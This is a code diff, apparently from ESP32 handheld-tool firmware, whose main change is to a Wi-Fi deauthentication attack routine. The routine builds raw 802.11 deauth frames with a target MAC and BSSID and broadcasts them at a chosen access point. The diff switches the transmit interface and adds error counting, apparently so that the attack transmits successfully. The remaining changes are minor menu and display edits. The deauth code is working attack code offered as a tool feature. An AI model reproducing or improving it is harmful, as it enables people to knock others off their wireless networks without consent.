@@ -65,7 +65,7 @@ static const char* DH_TOOL_NAMES[DH_TOTAL_TOOLS] = {
   "RF Raw View", "RF Live", "Lab Replay", "Test Beacon",
   // Page 6: System
   "Port Scan", "Pkt Monitor", "Sys Info", "Web Dash",
-  "HW Diag", "Input Mon", "About", "---"
+  "HW Diag", "Input Mon", "About", "Back"
 };
 
 static const uint16_t DH_TOOL_COLORS[DH_TOTAL_TOOLS] = {
@@ -610,13 +610,15 @@ static uint8_t dhDeauthFrame[26] = {
 };
 
 static volatile unsigned long dhDeauthPkts = 0;
+static volatile unsigned long dhDeauthErrs = 0;
 
 static void dhSendDeauth(const uint8_t target[6], const uint8_t bssid[6]) {
   memcpy(&dhDeauthFrame[4], target, 6);
   memcpy(&dhDeauthFrame[10], bssid, 6);
   memcpy(&dhDeauthFrame[16], bssid, 6);
-  esp_wifi_80211_tx(WIFI_IF_AP, dhDeauthFrame, sizeof(dhDeauthFrame), false);
-  dhDeauthPkts++;
+  esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_STA, dhDeauthFrame, sizeof(dhDeauthFrame), false);
+  if (rc == ESP_OK) dhDeauthPkts++;
+  else dhDeauthErrs++;
 }
 
 void dhRunDeauth() {
@@ -719,6 +721,7 @@ void dhRunDeauth() {
   drawTruncatedText(10, 30, ap.ssid.c_str(), SCR_W - 20, CLR_TEXT_MED, 1);
 
   dhDeauthPkts = 0;
+  dhDeauthErrs = 0;
   uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
   unsigned long lastDraw = 0;
   unsigned long holdStart = 0;
@@ -735,9 +738,12 @@ void dhRunDeauth() {
     if (millis() - lastDraw > 500) {
       char buf[32];
       sprintf(buf, "Pkts: %lu", dhDeauthPkts);
-      tft.fillRect(10, 50, SCR_W - 20, 20, CLR_BG);
+      tft.fillRect(10, 50, SCR_W - 20, 28, CLR_BG);
       tft.setTextColor(CLR_SUCCESS);
       tft.drawString(buf, 10, 50, 1);
+      sprintf(buf, "TxErr: %lu", dhDeauthErrs);
+      tft.setTextColor(dhDeauthErrs ? CLR_WARNING : CLR_TEXT_LO);
+      tft.drawString(buf, 10, 62, 1);
 
       tft.setTextColor(CLR_TEXT_LO);
       tft.drawString("HOLD SEL: stop", 10, SCR_H - 12, 1);
@@ -1308,7 +1314,10 @@ void dhSelect() {
       case 44: DH_ENTER_TOOL(DH_HW_DIAG, dhRunHwDiag())
       case 45: DH_RUN_TOOL(DH_INPUT_MONITOR, dhRunInputMonitor())
       case 46: DH_RUN_TOOL(DH_ABOUT, dhAbout())
-      case 47: break; // Reserved
+      case 47:
+        currentState = STATE_EYES;
+        renderCurrentPage();
+        break;
     }
   }
   else {
